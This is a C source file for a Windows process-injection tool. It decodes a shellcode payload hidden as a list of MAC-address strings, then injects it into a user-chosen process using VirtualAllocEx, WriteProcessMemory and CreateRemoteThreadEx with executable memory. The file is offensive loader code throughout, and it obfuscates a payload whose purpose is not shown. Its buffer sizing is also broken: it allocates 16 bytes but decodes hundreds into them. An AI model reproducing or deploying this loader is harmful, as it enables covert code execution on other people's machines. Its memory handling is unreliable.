#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Some macros to help in the process of writing and printing texts
#define okay(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define info(msg, ...) printf("[+]" msg "\n", __VA_ARGS__)
#define warning(msg, ...) printf("[-]" msg "\n", __VA_ARGS__)

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

void mac_to_shellcode(const char* mac_addresses[], size_t count, uint8_t* shellcode) {
    size_t index = 0;
    for (size_t i = 0; i < count; i++) {
        const char* mac_str = mac_addresses[i];
        size_t len = strlen(mac_str);

        for (size_t j = 0; j < len; j += 3) { // Increment by 3 to skip colons
            // Convert two hex characters to a byte
            char byte_str[3] = { mac_str[j], mac_str[j + 1], '\0' };
            uint8_t byte = (uint8_t)strtol(byte_str, NULL, 16);
            shellcode[index++] = byte;
        }
    }
}
int main(int argc, char* argv[]) {
    const char* mac_addresses[] = {
        "56:E3:2F:49:5E:47:7C:B1:B2:B3:F5:E4:F7:E7:EA:E8:EC:F3:8D:6F:DB:F7:4B:93:A2:8B:4F:97:DE:8F:43:9B:EA:86:FD:04:86:C0:67:9B:98:9B:5F:A7:86:9F:E9:19:76:E7:BD:A1:DC:F3:C0:A0:23:2A:E9:A4:E7:26:0A:04:B8:AA:BD:A5:65:BD:D0:7A:B0:CF:BC:F4:26:91:79:81:E2:F0:FE:F2:7B:8D:00:01:02:88:84:8D:06:07:08:41:8F:CB:78:6A:46:0E:C0:41:99:5B:0C:51:9D:57:38:50:1B:CB:FF:4B:53:2E:E9:69:DD:EA:65:AE:12:AF:60:28:FC:63:1D:ED:6F:EE:F9:3C:9E:72:35:F4:0E:D7:4D:C8:76:38:70:19:36:7A:79:90:37:9B:1C:01:CD:07:6C:00:4B:9B:2A:0C:C5:43:18:15:D9:13:48:1C:57:87:19:D2:5E:D3:14:5C:8E:1E:38:20:3A:3D:3D:3F:27:3F:29:30:2B:31:24:EE:82:4F:31:23:8D:93:2C:34:2F:2D:30:F2:68:92:37:82:81:80:DD:C8:3C:F4:F7:B7:D9:B4:BA:89:8A:CA:DA:C4:07:69:D8:10:7E:33:95:95:96:DE:11:7C:D3:27:9E:9D:8F:C3:0C:BB:15:E1:E5:F1:EF:2E:4C:E5:23:5A:ED:17:E2:D8:96:B6:4D:66:F8:3C:5C:DF:B9:B8:BA:BB:E5:FC:04:96:40:AA:C2:3C:11:AF:CC:86:96:99:9A:86:FD:04:83:FE:10:99:2D:13:9C:5C:14:9F:27:19:92:52:1D:9C:64:35:EF:3E:02:1C:31:AD:6F:20:82:F9:AB:B3:A0:64:0C:A7:79:08:B3:49:6D:50:82:96:07:2C:7F:3B:88:F7:B7:00:CE:74:E7:EB:97:05:06:07:40:8A:E6:1B:44"
    };

    size_t count = sizeof(mac_addresses) / sizeof(mac_addresses[0]);

    uint8_t* shellcode = (uint8_t*)malloc(count * 16); // Allocate 16 bytes per MAC address

    if (shellcode == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 1;
    }

    // Convert MAC addresses to shellcode
    mac_to_shellcode(mac_addresses, count, shellcode);

    // The rest of your code for process injection...
    if (argc < 2) {
        warning("You should enter the process ID to inject the SHELLCODE in!!\nUSAGE: R0m4.exe <PID>");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    info("Now we are trying to open the process with the ID: %ld\n", PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);

    if (hProcess != NULL) {
        okay("We got handle on the process: 0x%p", hProcess);

        // Allocate some bytes to the process memory
        rBuffer = VirtualAllocEx(hProcess, NULL, count * 16, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        info("Allocated %zu bytes with PAGE_EXECUTE_READWRITE permissions inside process %ld", count * 16, PID);

        // Write the shellcode into the allocated process memory
        printf("Shellcode:\n");
        for (size_t i = 0; i < count * 16; i++) {
            printf("\\x%02X", shellcode[i]);
            if ((i + 1) % 16 == 0) {
                printf("\n");
            }
        }
        WriteProcessMemory(hProcess, rBuffer, shellcode, count * 16, NULL);
        info("Wrote %zu bytes to process memory\n", count * 16);

        // Create a remote thread to run the payload
        hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

        if (hThread == NULL) {
            warning("The PID %ld doesn't exist, you should try other stuff\nError %ld", PID, GetLastError());
            CloseHandle(hProcess);
            return EXIT_FAILURE;
        }
        okay("We got handle on the Thread %ld: 0x%p", TID, hThread);

        okay("Cleaning up everything!!");
        info("Waiting for thread to finish...\n");
        WaitForSingleObject(hThread, INFINITE);
        info("Thread finished executing :)\n");

        CloseHandle(hProcess);
        CloseHandle(hThread);

        info("Finished, see you next time mate! ;)\n");

        return 0;
    }
    else {
        warning("The PID %ld doesn't exist, you should try other stuff\nError %ld", PID, GetLastError());
        return EXIT_FAILURE;
    }
}
